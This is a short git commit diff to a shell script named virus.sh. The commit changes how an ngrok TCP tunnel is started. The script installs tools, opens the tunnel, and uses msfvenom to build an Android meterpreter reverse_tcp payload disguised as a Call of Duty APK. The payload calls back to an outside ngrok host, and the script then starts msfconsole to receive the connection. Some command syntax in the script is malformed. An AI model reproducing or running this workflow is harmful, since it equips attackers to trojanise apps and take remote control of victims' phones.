2302813767e363f86f302f93ad262e4d4122a217
arduino90120 <60314719+arduino90120@users.noreply.github.com>
2022-05-10 20:40:34 +0200

    Update virus.sh

--- virus.sh
+++ virus.sh
@@ -2,6 +2,6 @@ sudo apt update && //sudo apt upgrade
 sudo apt install -y adb apache2 
 sudo cp /sdcard/Download/ngrok /root
 cd /root
-bash ngrok tcp 8080
+./ngrok tcp 8080
 msfvenom -p /android/meterpreter/reverse_tcp LHOST=6.tcp.ngrok.io LPORT=15298 /root <R CallOfDuty.apk
 msfconsole
